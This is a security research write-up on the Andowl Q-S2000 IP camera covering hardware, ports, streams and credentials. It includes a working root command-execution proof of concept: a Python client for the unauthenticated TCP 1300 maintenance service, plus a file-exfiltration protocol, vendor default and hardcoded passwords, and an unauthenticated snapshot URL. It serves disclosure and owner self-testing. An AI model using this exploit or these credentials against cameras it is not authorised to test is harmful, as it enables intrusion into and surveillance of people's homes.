> ⬅️ Back to the [short overview](../README.md)

# Andowl Q-S2000

<div align="center">

| The camera | The box |
|---|---|
| ![Andowl Q-S2000](../images/s2000.jpeg) | ![Q-S2000 packaging](../images/s2000package.jpeg.jpg) |

</div>

The **Andowl Q-S2000** ("Panoramic Camera", sold in South Africa as the *Full HD 4K Wireless Smart Camera – Waterproof Outdoor CCTV*) is one of the many rebrands of a Chinese Fullhan-based PTZ camera line.

- Listing: <https://www.takealot.com/andowl-q-s2000-full-hd-4k-wireless-smart-camera-waterproof-outdo/PLID72173391>
- Companion app at time of analysis: **CareCamPro 2.8.23** (`com.huiyun.care.viewerpro.googleplay` on Google Play)
- Camera model string: `AJL33PQ0806`, firmware `YGT.AJL33PQ0806-v220831.1043` (built 2022-08-31)

> Everything here comes from one unit on my personal bench and network. Other Q-S2000 / Andowl / rebrand units may use different silicon — trust the device's own `dmesg` over marketing pages.

**Scope.** Every result below came from testing **a camera I own, on my own network**. If you use any of this, use it on hardware you own or are explicitly authorised to test.

## Under the hood (as reported by the device itself)

| Component | What it actually is |
|---|---|
| SoC | **Fullhan FH8626V100** — ARMv6 single-core @ 600 MHz |
| OS | **Linux 4.9.129**, built with a Fullhan uClibc toolchain |
| RAM | 512 Mbit DDR; kernel sees `mem=40M` plus a 24 MB media heap |
| Flash | **8 MB SPI NOR** (`mx25l6405d`): bootstrap / u-boot env / u-boot / 3 MB kernel / 512k data / 512k res / **~3.75 MB app** (squashfs) |
| WiFi | USB **Realtek RTL8188FU** dongle ("802.11n") — `wlan0` = client, `wlan1` = **setup access point at 192.168.66.1/24** |
| Ethernet | GMAC controller present, but **MAC address is randomized on every boot** and the port is not used in normal operation |
| Console | **UART `ttyS0` @ 115200** (two more UARTs exist internally) |
| Storage | microSD slot (card shows up as `mmcblk0`) |
| Optics | Two lenses: **3.6 mm wide + 12 mm telephoto** (the "10X digital zoom"), PTZ capable, IR + white LEDs, WDR |
| Video | Main stream 1920×1080 @ 17 fps H.264, sub stream 640×360; audio 8 kHz G.711-ish |

Marketing says "4K"; the camera negotiates 1080p max on my unit.

## Interesting bits

- **It's a little Linux server.** Despite the tiny flash, this is a real Linux box with u-boot, a 3 MB kernel partition, jffs2 data partition, three serial ports and a hardware AES engine. All classic embedded-linux things (serial console, flash dump, partition extraction) apply.
- **It streams RTSP on your LAN after all — no cloud needed.** Port **8554** runs `YGTek RTSP Server 2.0`; `/profile0` is 1080p H.264 + G.711 audio, `/profile1` is 640×360. Both profiles run at **16.67 fps**. DESCRIBE is Digest-auth protected (realm `ygtechnologyshanghai`, **no `qop`**) with the **vendor default `admin` / `admin123456`**. Digest **only** — a `Basic` header is refused with a fresh digest challenge, so clients that can't do digest auth will not connect. The newer app builds hiding "local stream/RTSP" is a *client-side* removal — the server was always there. Change that password if you put this camera on a network you care about (see [Using the streams](#using-the-streams) for working commands).
- **What's actually listening** (from the camera's own `netstat -tlnp`):

  | Port | Service | Notes |
  |---|---|---|
  | 23 | BusyBox `telnetd` behind `inetd` | login protected — no default password worked for me |
  | 843 | Adobe Flash socket-policy server | answers `policy-file-request` with `allow-access-from domain="*" to-ports="*"` |
  | **1300** | vendor maintenance service (`/app/abin/noodles`) | **no authentication of any kind** — see the security note below |
  | 6688 | embedded **GoAhead** web server (`/app/abin/apollo`) | `GET /snapshot.jpg` returns a live 640×368 JPEG **with no login**; `/` sends a 301 to port 80, where nothing listens; every other path (`/cgi-bin/`, `/index.html`, `/www`, unknown paths) closes the connection **with no HTTP response at all** — the web surface is essentially one URL |
  | 8554 | RTSP (`YGTek RTSP Server 2.0`) | Digest auth, vendor default creds (above) |
  | 8699, 9876, 16668 | vendor app/protocol service (`apollo`) | the same proprietary protocol the phone app uses — they accept TCP, then answer nothing to HTTP |

  There is no web server on 80/443. On UDP the only listener worth noting is **3702** (WS-Discovery) — bound, but it does not answer probes; see [ONVIF](#onvif-in-the-binary-dormant-on-the-wire).
- **Security note — the maintenance service on 1300 is unauthenticated and will run shell commands as root, returning the command's output to the caller.** Verified on my own unit: one TCP connect and one XML request, no password, no source-IP check, stdout comes back on the same socket. The chain is published below rather than withheld — see [Getting a root shell on your own unit](#getting-a-root-shell-on-your-own-unit-proof-of-concept). The practical point for an owner stands regardless: **anyone on the same Wi-Fi can own this camera.** Keep it on an isolated network, or block inbound LAN access to 1300 and 6688, until the firmware is fixed.
- **The two big vendor binaries are UPX-packed** (`apollo` 1.1 MB on disk, `noodles` 65 KB), so `strings`/`grep` over the flash partition tells you almost nothing — even a plain-text search for a password you *know* works comes back empty. The real code only appears in the running process (`/proc/<pid>/mem`), which is where I unpacked both from; the binaries stay off this repo for licensing reasons. Worth knowing: the packing is only half the story — see [Credentials found](#credentials-found-and-where-each-one-applies) for a password that exists nowhere on flash at all.
- **Scanning this camera needs patience.** At normal nmap speeds the 600 MHz device drops probes and a full sweep falsely reports "only port 23 open". A slow scan (`--max-rate 25`, targeted ranges) found the RTSP and vendor ports. Use TCP, and don't trust ping — the camera filters ICMP.
- **All the config is plain JSON with a `.db` extension.** Nothing in the config store is encrypted: device model, stream settings, alarm policies, night-IR schedules, cloud account identifiers — all readable text.
- **Cloud endpoints**: signalling `svr.smartcloudcon.com`; app APIs `exwebsvr.smartcloudcon.com`, `exsvr.smartcloudcon.com`, `gm-us.smartcloudcon.com`; picture/video storage on Huawei OBS and Tencent COS. P2P relay uses Google Cloud IPs (e.g. `34.82.228.200:25515`).
- **The app and camera speak the same proprietary SDK** (log tags like `ZJViewerSdk`, `TrasLocalLan`, `CMD_TASK`) — the same vendor stack runs on both sides of the connection, so app logs describe camera traffic in the camera's own words.

## Using the streams

| Stream | URL | Result |
|---|---|---|
| Main | `rtsp://<cam>:8554/profile0` | H.264 Main **1920×1080 @ 16.67 fps** + G.711 µ-law 8 kHz mono |
| Sub | `rtsp://<cam>:8554/profile1` | H.264 Main **640×360 @ 16.67 fps** + the same audio |
| Still frame | `http://<cam>:6688/snapshot.jpg` | 640×368 JPEG, **no authentication at all** |

The SDP hands out *absolute* track URLs, which matters if you write your own client:

```
Content-Base: rtsp://<cam>:8554/profile0/
  video  a=control: rtsp://<cam>:8554/profile0/track=v
  audio  a=rtpmap:0 PCMU/8000/1   a=control: rtsp://<cam>:8554/profile0/track=a
```

Verified working commands (credentials in the URL are accepted):

```bash
ffprobe -rtsp_transport tcp "rtsp://admin:admin123456@<cam>:8554/profile0"

# video only — mp4 + G.711 is a bad combination, so drop the audio:
ffmpeg -rtsp_transport tcp -i "rtsp://admin:admin123456@<cam>:8554/profile0" -c copy -an out.mp4

# with audio — matroska carries µ-law happily:
ffmpeg -rtsp_transport tcp -i "rtsp://admin:admin123456@<cam>:8554/profile1" -c copy out.mkv

# single snapshot frame from the stream:
ffmpeg -rtsp_transport tcp -i "rtsp://admin:admin123456@<cam>:8554/profile1" -frames:v 1 -update 1 snap.jpg
```

Always force `-rtsp_transport tcp`: the Wi-Fi link is lossy enough that UDP gives you artefacts. VLC handles the digest challenge on its own (*Media → Open Network Stream*).

`snapshot.jpg` **ignores query parameters** — `?subtype=1`, `?channel=1&subtype=0` and friends all return the same 640×368 frame, so there is no per-profile snapshot endpoint on this unit.

## Getting a root shell on your own unit (proof of concept)

`/app/abin/noodles` listens on **TCP 1300** and speaks a small XML protocol. Disassembling the unpacked binary, the dispatcher (`FUN_00011a24`, the one that prints `@@@@@@@@@@ NOODLES v%s START @@@@@@@@@@`) compares twelve verb strings in sequence and branches straight to a handler — **there is no authentication code path and no source-IP check anywhere in it**:

`UPGRADE`, `BURNMAC`, `ELFEXEC`, `SYSTEM`, `SYSTEMEX`, `DOWNLOAD`, `UPLOAD`, `FLASHDUMP`, `BURNSN`, `READSN`, `WRITEENV`, `READENV`

The two that matter for an owner:

- **`SYSTEM`** runs a command as root and always answers `<SYSTEM_ACK>ok</SYSTEM_ACK>` — blind, no output.
- **`SYSTEMEX`** runs a command as root and **returns stdout**. In the binary, `cmd_systemex` (`0x146e4`) calls `ut_system_ex` (`0x17bc4`), which is a plain `popen(cmd, "r")` reading up to `0x7ff` bytes.

The exchange, exactly:

```
connect TCP/1300
send   <SYSTEMEX>id; uname -a</SYSTEMEX>\n
recv   <SYSTEMEX_ACK>N</SYSTEMEX_ACK>        # N = strlen of the output
send   <SYSTEMEX_ACK>cont</SYSTEMEX_ACK>\0   # NUL-terminated, NO trailing newline
recv   N bytes of stdout
```

That third line is the part that stalls people: the device `strcmp`s the buffer it received against the literal `<SYSTEMEX_ACK>cont</SYSTEMEX_ACK>`, so a stray `\n` makes it silently abandon the output. Minimal working client:

```python
import socket
CAM, CMD = "192.168.1.50", "id; uname -a"   # your camera's address
ACK = b"<SYSTEMEX_ACK>cont</SYSTEMEX_ACK>\x00"

s = socket.create_connection((CAM, 1300), 20)
s.sendall(f"<SYSTEMEX>{CMD}</SYSTEMEX>\n".encode())
hdr = b""
while not hdr.endswith(b"</SYSTEMEX_ACK>"):
    hdr += s.recv(1)
n = int(hdr.split(b">")[1].split(b"<")[0])
if n:
    s.sendall(ACK)
    out = b""
    while len(out) < n:
        out += s.recv(n - len(out))
    print(out.decode(errors="replace"))
# uid=0(root) gid=0(root) groups=0(root) … Linux … 4.9.129 … armv6l
```

Practical limits: **2047 bytes of output maximum**, the command string is capped at **0x80 bytes**, and the length is `strlen`, so output is cut at the first NUL — keep on-device `grep`s printable (`grep -a -o -E '[ -~]{0,48}pattern'`). It is `popen("/bin/sh")`, so pipes and redirection work.

Reading and writing the environment needs no shell at all:

```
<READSN></READSN>            →  <READSN_ACK>…serial…</READSN_ACK>
<READENV>name</READENV>      →  <READENV_ACK>name=value</READENV_ACK>
```

File *exfiltration* is the `UPLOAD` verb (camera → you): send `<UPLOAD><LOCALNAME>/abs/path</LOCALNAME></UPLOAD>\n`, the device replies `<UPLOAD_REQUEST>SIZE</UPLOAD_REQUEST><CHECKSUM>MD5-UPPERCASE</CHECKSUM>`, you answer `<UPLOAD_ACK>cont</UPLOAD_ACK>` — **again NUL-terminated, no newline** — and it streams `0x400`-byte writes. It runs at roughly 1 KB/s over this Wi-Fi link, and large single files stall, so pull in ~32 KB chunks and re-request failures. This is how both vendor binaries were unpacked for analysis.

**Do not touch `UPGRADE`, `FLASHDUMP`, `BURNSN`, `BURNMAC` or `WRITEENV`** unless you are ready to re-flash or re-identify the device — `UPGRADE` writes `/home/Flash.img` to flash and runs the vendor's own `/app/iu_s.sh` + `/app/kill_app.sh`, and `BURNSN`/`BURNMAC` rewrite the serial and MAC that the cloud service uses to know the device exists. On a 600 MHz single core, also run one command at a time and clean up anything you drop in `/tmp` (RAM is the only writable space with room, and it has about 1 MB).

## ONVIF: in the binary, dormant on the wire

`apollo` carries a complete ONVIF stack — SOAP namespaces (`tds:`, `tt:`, `trt:`, `tmd:`, `tev:`), `GetCapabilities`/`GetServiceCapabilities` templates, PTZ/imaging/analytics space URIs, and handler names including `onvif_port_set_imaging_settings`, `onvif_port_get_scopes_string`, `onvif_port_update_motion_rule` and **`onvif_port_set_network_interfaces`**. The advertised service address is a literal in the binary:

```
http://%s:%d/onvif/device_service
```

with `<tt:Device>`, `<tt:Media>`, `<tt:Events>`, `<tt:Imaging>`, `<tt:Analytics>` `XAddr` entries and `ver10/device`, `ver10/media`, `ver10/events`, `ver20/ptz`, `ver20/imaging`, `ver20/analytics` WSDL namespaces. Discovery is implemented in both directions — it announces (`ONVIF Hello from %s:%d`, `ONVIF Bye`) and answers (`onvif_probe_rly: rip=[…], service_ip=[…]`).

On the wire today, though, none of it is reachable:

- The camera **has UDP 3702 bound**, but a WS-Discovery `Probe` gets **no reply** — not multicast (`239.255.255.250:3702`) and not unicast straight to the camera.
- A well-formed `GetDeviceInformation` SOAP `POST` to `/onvif/device_service` on **8699, 9876, 16668 and 6688** returns **zero bytes**. The three high ports accept the TCP connection and then answer nothing to any HTTP.
- The config store contains **no ONVIF entries at all**, and one of the error strings (`Not found onvif scope`) suggests the responder needs a configured scope before it will answer.

So ONVIF clients (ONVIF Device Manager, NVRs, `onvif-cli`) will **not find this camera today**, and ONVIF is currently *not* a way to view the stream or manage credentials. The open question for whoever picks this up next: what does `get_onvif_port` return, and is there a config key that turns the service on.

## Credentials found, and where each one applies

| Credential | Where it works | Status |
|---|---|---|
| `admin` / `admin123456` | RTSP, TCP 8554, **Digest only** | **Verified working** on `/profile0` and `/profile1` |
| *(none)* | TCP 1300 maintenance service | **Verified: no password, no IP check** — this is the root path |
| *(none)* | TCP 6688 `/snapshot.jpg` | **Verified: no login**, live JPEG |
| `!qwert12345` | app diagnostic-log zip (ZipCrypto) | derived from app code; **not yet re-proven against a fresh export** |
| `tlJwpbo6` | a hardcoded **internal RTSP client URL** inside `apollo` | **not a working LAN login** — see below |
| `admin`/`admin`, `admin`/`123456`, `admin`/`12345`, `admin`/`admin123`, `admin`/`888888`, `admin`/`111111`, `admin`/`1234`, `root`/`root`, `admin`/`password` | RTSP | all rejected |
| root (telnet, TCP 23) | BusyBox `telnetd` behind `inetd` | **not cracked** — numeric and short-lowercase DES brute force came up empty |
| web login, 6688 | GoAhead | **no live user entries exist**; `auth.txt` in the image is only the template (sample line `user name=joshua password=<md5-hex>`) |

Two details worth understanding before you go looking for these strings yourself:

- **The UPX packing is not what hides the password.** `admin123456` is absent from every file on flash *and* from `apollo`'s code and read-only data — it exists **only in the process heap** (twice), while the read-only data holds separate `admin` and `123456` literals plus `apl_rtsp_get_user_password` / `valid_user_password` / `TODO::reset user password`. That is consistent with a config-backed user password with a compiled-in default — i.e. probably changeable — but **changeability is not proven here**.
- **`tlJwpbo6`** does appear in read-only data as `user=admin_password=tlJwpbo6`, and at runtime it expands to `user=admin_password=tlJwpbo6_channel=1_stream=0.sdp?real_stream` — a Hikvision-style URL that `apollo` uses as an RTSP **client**. Tested as a login against the camera's own RTSP service (`admin:tlJwpbo6`, `tlJwpbo6:tlJwpbo6`, and the URL-shaped variants) it is **rejected**. It is a hardcoded vendor credential worth reporting, but it is *not* a backdoor password for the LAN stream, and it should not be presented as one.

Device identifiers, cloud account IDs, relay keys and session tokens are deliberately not reproduced here.

## Checking your own unit

```bash
# what is listening, slowly — a fast sweep gives false negatives on this SoC
nmap -sT -Pn --max-rate 25 -p 23,843,1300,6688,8554,8699,9876,16668 <cam>

# unauthenticated snapshot
curl -s -o snap.jpg -w '%{http_code} %{content_type} %{size_download}\n' http://<cam>:6688/snapshot.jpg

# RTSP with the vendor default
ffprobe -rtsp_transport tcp "rtsp://admin:admin123456@<cam>:8554/profile0"

# the maintenance service answers without credentials
printf '<READSN></READSN>\n' | nc -w 5 <cam> 1300
```

If any of those answers, the mitigation is the same: **put the camera on an isolated network or VLAN, or firewall inbound TCP 1300 and 6688 on the LAN**, and change the RTSP password if the firmware lets you.

## The app diagnostic log zip password

The encryption is **legacy PKZIP ZipCrypto** with a hardcoded password:

```
!qwert12345
```

Inside you get the camera's own filesystem logs, e.g. `dmesg.log`, `driver1/2.log`, `ifconfig.log`, `uptime.log`, runtime logs, and the camera-side config store.

Confidence note: that password was read out of the app's own zip writer (`com/huiyun/framwork/utiles/m1.java`, dispatched from `vj/c.java`), not observed in a captured file — treat it as code-derived until someone confirms it on a fresh export.

## Log layout (what's inside the archives)

```
SDKFlashLog/
  ZJCONF/config/   camera config store (plaintext JSON .db files)
  ZJCONF/log/      flash-resident runtime logs
  ZJSYS/systemcfg.db   device identity, cloud account IDs, sign server
  SDKTFLog/log/    rotated runtime logs written to the microSD card
DeviceLog/
  dmesg.log  driver1.log  driver2.log  ifconfig.log  uptime.log
```

## Notable quirks observed

- Ethernet MAC is random per boot; if you cable it up, expect the MAC (and any DHCP lease) to change after every reboot.
- Device RTC drifts badly when offline — log timestamps are only reliable relative to each other.
- The setup soft-AP (`192.168.66.1`) stays configured on `wlan1` even in client mode.
- **The microSD card does not survive well.** Continuous logging plus the small `FAT` volumes wore mine out during analysis (the card re-enumerated in `dmesg` and the filesystem went read-only with corrupt directory entries). If you want the recordings, image the card with `ddrescue` first and work on the image, not the card.

## Gotchas for whoever picks this up next

Things that cost me time or produced a wrong answer — including my own mistakes, recorded so the next person doesn't repeat them:

- **`grep` on a binary image can silently lie to you.** Under a UTF-8 locale, GNU `grep` skips byte sequences it can't decode and quietly misses perfectly good ASCII strings. Two of my earlier "that string isn't in the binary" conclusions were artefacts of this. Always use `LC_ALL=C grep -a` on firmware and memory images. Re-running one search this way took a string count from 1,077 to 14,666 and revealed the whole RTSP/ONVIF picture.
- **The XML acks are compared with `strcmp`.** For both `SYSTEMEX` and `UPLOAD`, the expected reply must be sent **NUL-terminated with no trailing newline** — otherwise the device silently discards the output/transfer and you sit waiting on a timeout. This is the single most common reason people report those verbs "don't work".
- **BusyBox here is v1.26.2 and the applet set is thin.** Present: `ash awk cat chmod cp cryptpw dd df dmesg du echo env expr find free fsync grep head kill ls netstat ps sed sync tail telnetd wget ftpput ftpget`. Missing: `nc base64 hexdump od uudecode httpd sort uniq tr wc strings seq`, and there is no telnet *client*. `grep -b` (byte offset) is not supported.
- **Never exfiltrate binary through a shell session.** A `telnetd` session mangles bytes (IAC escaping plus CR/LF translation), so a `gzip` piped through it will not decompress. Use the `UPLOAD` verb instead, in ~32 KB chunks.
- **Do not stage anything on the microSD card.** Continuous logging had already worn mine out; writing working files onto it corrupted the FAT (`fat_get_cluster: invalid cluster chain`), the volume remounted read-only and the card re-enumerated in `dmesg`. Use `/tmp` (RAM, roughly 1 MB of headroom) and clean up afterwards — and note that a reboot wipes `/tmp` and any temporary listener you started.
- **Do not scan and probe at the same time.** A 250 pps sweep makes the 600 MHz single core drop probes and produces false negatives; with `--max-rate 25` the same ports appear reliably. ICMP to the camera is filtered, so `-Pn`. The router will happily answer ARP/ICMP for unused addresses on the subnet, which makes phantom hosts look alive.
- **Reading `/proc/<pid>/mem` requires the mapping list first.** Dumping an address in the gap between segments yields a zero-length file rather than an error, and there is an unmapped gap in `apollo`'s layout (`0x303000–0x312000`). Check `/proc/<pid>/maps` before choosing `dd skip=`/`count=`.
- **Host-side tooling:** stock `objdump` has no ARM backend and `eu-objdump` recognises the ELF but refuses to disassemble it. `capstone` (Python) works fine for targeted disassembly. Ghidra will not load a raw `/proc/pid/mem` image until you synthesize a section table for it — the trick is worth knowing.

## Status

Work in progress — more will be added as time allows. Settled so far: hardware identity, the full port map from the device itself, the unauthenticated root path on 1300 (including command output), the RTSP surface and its defaults, the unauthenticated snapshot, the ONVIF situation above, and the diagnostic-zip password. Still open: how the RTSP user password is assembled and whether it is changeable; what `get_onvif_port` would advertise and whether anything enables it; the GoAhead version and its compiled-in routes; the app-facing `METHOD` opcodes; a complete firmware backup (best done over wired ethernet once the random-MAC-per-boot behaviour is handled); and recovering the recordings from the dead microSD card.
